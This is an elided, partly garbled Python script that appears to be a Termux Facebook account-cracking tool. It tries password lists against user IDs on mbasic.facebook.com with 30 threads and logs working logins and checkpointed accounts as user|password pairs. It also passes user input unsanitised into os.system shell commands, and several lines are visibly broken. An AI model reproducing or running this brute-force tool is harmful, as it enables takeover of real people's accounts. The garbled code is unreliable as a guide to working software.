...
from concurrent.futures import ThreadPoolExecutor as ALAMGIRabba
from datetime import datetime
from bs4 import BeautifulSoup
...
from concurrent.futures import ThreadPoolExecutor as ALAMGIRMahar
...
def version():
    ...
    print(' \033[1;92m[07] \033[1;93m termux xyz ')
...
def fileclone():
    ...
    print(' \033[1;92m[0] \033[1;93mBack to home ')
    print(54*"_")
    print("")
    ALAMGIR = input('Choose method : ')
    if ALAMGIR in ('1', '01'):
        __crack__().plerr()
    if ALAMGIR in ('02', '2'):
    	__xxx__().ALAMGIRx(id)
...
class __crack__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write(f"\r \x1b[1;92m[ALAMGIR] {loop}/{len(self.id)} [OK-{len(ok)}] [CP-{len(cp)}] ")
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;32m[ALAMGIR-OK] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				...
				try:
					...
					month = bulan_ttl[month].print('\r\033[1;91m[ALAMGIR-CP] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					...
					pass
				print('\r\033[1;91m[ALAMGIR-CP] %s | %s%s      ' % (user,pw,tahun(user)))
	...
	def __pler__(self):
		os.system("clear")
		print(banner)
		print ("\033[1;32m [1] \033[1;33mMethod Super Fast ")
...
class __xxx__:
    ...
    def __pler__(self):
            ...
            print(54*"_")
            print("")
            with ALAMGIRabba(max_workers=30) as ALAMGIR:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        ALAMGIR.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
...
\33[0;92m│                                            │
\33[0;92m└───────────────────────────────────────────────────────────┘  \033
\33[0;92m  __________________This tool is edit by rana zakwan______________________
\033[1;92m    | [\033[1;31;1m©\033[1;92m]  [\033[1;31;1m©\033[1;92m] |​
 \033[1;92m   |  [\33[1;33m====\033[1;92m]  | [+] Twitter @ ranazakwan [+]
\033[1;92m╔══o00════════00o═════════════════════════╗
\033[0;92m█ \033[1;92m [•] \033[0;92mAuthor    :  \033[1;92m Rana Zakwan           \033[1;31;1m █
\033[0;92m█ \033[1;92m [•] \033[0;92mWhatsapp  :  \033[1;92m +01712034653        \033[1;31;1m █
\033[0;92m█ \033[1;92m [•] \033[0;92mWhatsapp  : \033[1;92m  01712034653           \033[1;31;1m █
\033[0;92m█ \033[1;92m [•] \033[0;92mGroup Fb  :  \033[1;92m Rana zuqwan Azhar\033[1;31;1m █
\033[0;92m█ \033[1;92m [•] \033[0;92mVersion   :  \033[1;92m 4.1                  \033[1;31;1m█
\033[1;92m╚═════════════════════════════════════════╝
"""
ct = datetime.now()
n = ct.month
...
def dupcutter():
	...
	ALAMGIR = input('[+] New File Save As : ')
	os.system('touch ' +ALAMGIR)
	os.system('sort -r '+Mahar+' | uniq > '+ALAMGIR)
	print("")
	print("")
	print(54*"\033[1;33m_")
	print("")
	print("[+] Removing Successful  From File " + Mahar )
	print("[+] New File Save " + ALAMGIR )
	print(54*"\033[1;33m_")
	time.sleep(2)
